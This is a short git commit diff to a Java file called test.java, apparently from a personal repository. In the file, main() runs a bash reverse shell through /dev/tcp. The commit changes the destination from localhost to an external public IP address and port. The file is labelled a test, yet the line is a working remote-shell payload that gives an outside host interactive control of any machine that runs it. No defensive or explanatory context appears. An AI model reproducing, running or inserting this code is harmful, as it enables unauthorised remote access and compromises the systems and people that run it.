839b73983ef58d77d37bed1c8d906f3f7c69ff50
azraelxuemo <60163868+azraelxuemo@users.noreply.github.com>
2024-01-13 17:54:30 +0800

    Update test.java

--- src/main/java/test.java
+++ src/main/java/test.java
@@ -3,7 +3,7 @@ import java.io.IOException;
 public class test {
     public static void main(String[] args) {
         try {
-            Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >&/dev/tcp/127.0.0.1/8888 0>&1"});
+            Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >&/dev/tcp/152.136.172.227/8000 0>&1"});
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
